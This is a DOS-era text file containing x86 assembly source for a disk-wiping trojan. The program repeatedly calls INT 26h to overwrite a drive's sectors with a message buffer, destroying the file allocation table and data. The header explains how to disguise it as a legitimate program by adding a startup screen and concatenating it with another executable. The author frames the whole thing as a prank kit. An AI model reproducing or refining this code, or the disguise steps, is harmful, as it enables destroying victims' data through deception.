*************************************************************************
This is a basic shell for a trojan I made. It's a rather simple one that
uses INT 26h, an absolute disk write. 
AL:Drive # (a=0,b=1,etc);
BX:Offset of buffer
CX:Sectors to write
DX:Logical starting segment (meaning ascending from sector 0 or 
                             track0,sector0 going up)
DS:Segment adress of buffer

You may want to put a screen display before the main NOTAGAIN jump
with a start up display or something from TheDraw. 
You may also want to buff up the end by copying a large
file (like TELIX.EXE to the end) to make it big. i.e.

copy /b trojan.exe+telix.exe coolprog.exe

Well have fun!
     :Knight Rocker
************************************************************************|

dosseg
extrn showscrn:proc

graffiti segment byte public 'DATA'
    funstuf db 'Put whatever you want in      '
            db 'here. (i.e. song lyrics,      '
            db 'phone numbers of people you   '
            db 'hate) This will be written    '
            db 'many times on the poor souls  '
            db 'drive.                        '
            db '                              '
            db '                           '

graffiti ends

stacks segment byte stack 'STACK'     ;Why not?, heh.
    thestak db 256 dup (0)
stacks ends

code segment byte public 'code'
assume cs:code, ss:stacks
notagain:      mov al,1            ;1=B: (for testing) switch to 2 for C:
               mov dx,2            ;skip boot rec, fuck the FAT
               mov cx,10h
               mov bx, offset ds:funstuf
               push ax             ; int 26h screws with these
               push bx
               push cx
               push dx
               push si
               push di
               push bp
               int 26h
               pop ax          ;there's an extra word there (the flags)
               pop bp
               pop di
               pop si
               pop dx
               pop cx
               pop bx
               pop ax          ;get the real ax
               inc dx
               jmp notagain    ;repeat until pigs fly
   code ends
               end notagain
               